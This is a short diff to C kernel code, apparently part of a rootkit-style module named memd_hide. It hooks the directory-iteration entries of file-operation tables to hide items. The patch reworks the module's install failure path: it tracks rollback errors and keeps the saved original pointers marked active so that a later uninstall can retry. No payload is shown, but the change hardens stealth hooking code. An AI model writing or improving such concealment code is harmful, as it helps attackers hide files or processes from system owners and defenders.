@@ -354,14 +354,30 @@ int memd_hide_install(void)
      return 0;
 
  fail:
-     for (i = 0; i < installed; i++) {
-         uninstall_hooks_from_fops(hooked_fops[i].ops, hooked_fops[i].orig_iterate);
+     {
+         int r;
+         int rb_err;
+         rb_err = 0;
+         for (i = 0; i < installed; i++) {
+             r = uninstall_hooks_from_fops(hooked_fops[i].ops, hooked_fops[i].orig_iterate);
+             if (r)
+                 rb_err = r;
+         }
+         spin_lock_irqsave(&syshook_lock, flags);
+         if (rb_err) {
+             /* A rollback restore failed: that table still points at
+              * our code, so keep the orig pointers and mark active —
+              * a later uninstall retries with the saved origs instead
+              * of leaking a hooked table with no record. Unpatched
+              * entries no-op in that retry (live already equals orig). */
+             atomic_set(&hook_active, 1);
+         } else {
+             hooked_fops_count = 0;
+         }
+         spin_unlock_irqrestore(&syshook_lock, flags);
+         mutex_unlock(&syshook_mutex);
+         return ret;
      }
-     spin_lock_irqsave(&syshook_lock, flags);
-     hooked_fops_count = 0;
-     spin_unlock_irqrestore(&syshook_lock, flags);
-     mutex_unlock(&syshook_mutex);
-     return ret;
  }
 
 int memd_hide_uninstall(void)
